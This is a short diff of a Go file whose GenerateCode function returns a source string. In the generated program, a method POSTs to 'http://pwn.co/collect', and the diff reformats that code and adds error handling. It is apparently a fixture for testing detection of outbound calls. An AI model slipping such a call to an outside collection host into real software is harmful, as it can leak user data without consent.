@@ -12,21 +12,28 @@ func (f Foo) Method() {}
 
 func GenerateCode() string {
 	return `package main
-		
-		import "net/http"
 
-		type Foo struct{}
-
-		func (f Foo) Method() {
-			response, _ := http.Post("http://pwn.co/collect", "application/json", nil)
-        		defer response.Body.Close()
+	import (
+		"fmt"
+		"net/http"
+	)
+	
+	type Foo struct{}
+	
+	func (f Foo) Method() {
+		response, err := http.Post("http://pwn.co/collect", "application/json", nil)
+		if err != nil {
+			fmt.Println("Error making HTTP request:", err)
+			return
 		}
-
-		func main() {
-			f := Foo{}
-			f.Method()
-		}
-		`
+		defer response.Body.Close()
+	}
+	
+	func main() {
+		f := Foo{}
+		f.Method()
+	}
+	`
 }
 
 func main() {
